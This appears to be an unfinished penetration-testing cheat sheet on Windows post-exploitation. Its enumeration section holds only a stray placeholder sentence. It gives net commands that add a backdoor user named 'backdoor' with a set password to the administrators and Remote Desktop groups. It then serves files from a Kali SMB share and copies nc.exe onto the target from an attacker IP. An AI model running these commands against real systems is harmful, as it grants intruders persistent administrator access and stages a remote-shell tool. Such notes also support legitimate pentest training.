# Windows Enumeration

## Enumeration Scripts

Becoming a super hero is a fairly straight forward process:

## Windows Post Exploitation

### Create Backdoor User <a id="backdoor_user"></a>

```text
net user backdoor backdoor123 /add
net localgroup administrators backdoor /add
net localgroup "Remote Desktop Users" backdoor /add
```

### Spin up SMB Share on Kali

`impacket-smbserver SMBSHARE ./`

#### Connect to share from windows

copy \\10.11.0.53\SMBSHARE\nc.exe





